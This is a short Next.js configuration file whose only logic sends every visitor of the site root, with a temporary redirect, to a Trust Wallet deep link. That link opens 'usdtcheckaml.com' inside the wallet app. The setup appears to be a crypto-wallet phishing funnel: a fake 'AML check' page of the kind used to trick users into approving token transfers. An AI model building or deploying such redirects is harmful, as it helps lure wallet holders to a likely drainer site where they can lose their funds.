import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  reactCompiler: true,

  async redirects() {
    return [
      {
        source: "/",
        destination:
          "https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com",
        permanent: false, // 302
      },
    ];
  },
};

export default nextConfig;
